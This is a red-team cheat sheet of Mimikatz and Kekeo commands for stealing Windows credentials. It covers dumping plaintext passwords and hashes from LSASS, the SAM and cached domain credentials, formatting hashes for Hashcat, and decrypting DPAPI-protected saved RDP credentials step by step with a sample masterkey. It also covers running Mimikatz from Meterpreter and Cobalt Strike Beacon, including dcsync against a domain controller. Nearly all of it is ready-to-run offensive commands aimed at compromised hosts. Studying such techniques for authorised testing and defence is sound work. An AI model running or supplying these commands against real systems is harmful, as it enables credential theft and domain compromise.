# Mimikatz and Kekeo Commands

## Sekurlsa

Get the classic `logonpasswords` for hashes and plaintext:

`mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"`

## LSADump

Dumping a computer's SAM:

`mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam"`

This returns the SysKey, SAMKey, and hashes.

Dumping cached domain credentials (MsCacheV2):

`mimikatz.exe "privilege::debug" "token::elevate" "lsadump::cache"`

MsCacheV2 creds are type 2100 and need to be formatted for Hashcat like so:

`$DCC2$10240#USERNAME#HASH`

## DPAPI

Can be used tor ecover saved credentials, like for RDP. A good example use case: https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/

Check for saved RDP credentials and other creds:

`vaultcmd /listcreds:"Windows Credentials" /all`

Saved creds are stored in: C:\Users\<username>\AppData\Local\Microsoft\Credentials\*

Review the contents of a user's Credentials directory:

`Get-ChildItem C:\Users\<username>\AppData\Local\Microsoft\Credentials\ -Force`

Example child item: 2647629F5AA74CD934ECD2F88D64ECD0

Take a look at blob with Mimikatz:
`mimikatz.exe "dpapi::cred /in:C:\Users\some_user\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0"`

`pbData` is what we want to decrypt and `guidMasterKey` is the key.

Check lsass.exe for the key:
`mimikatz.exe "privilege::debug" "sekurlsa::dpapi"`

Look for a `masterkey` field associated with the target user. Assuming one is found, decrypt the cached credentials:

`mimikatz.exe "dpapi::cred /in:C:\Users\rasta_mouse\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b"`

Plaintext password is found in `CredentialBlob`.

## Mimikatz from Meterpreter

Migrate to a 64-bit process before proceeding. Then `use kiwi` or `use mimikatz`.

## Mimikatz from a Beacon

The `logonpasswords` command will use mimikatz to recover plaintext passwords and hashes for users who are logged on to the current system. The logonpasswords command is the same as [beacon] -> Access -> Run Mimikatz.

Use `dcsync [DOMAIN.FQDN] [DOMAIN\user]` to pull a password hash for a user from the domain controller. This technique uses Windows APIs built to sync information between domain controllers. It requires a Domain Administrator trust relationship. Beacon uses Mimikatz to execute this technique.

Use `mimikatz` to execute a custom Mimikatz command, such as those above. Prefix a command with a `!` to force mimikatz to elevate to SYSTEM before it runs your command. For example, mimikatz `!lsa::cache` will recover salted password hashes cached by the system.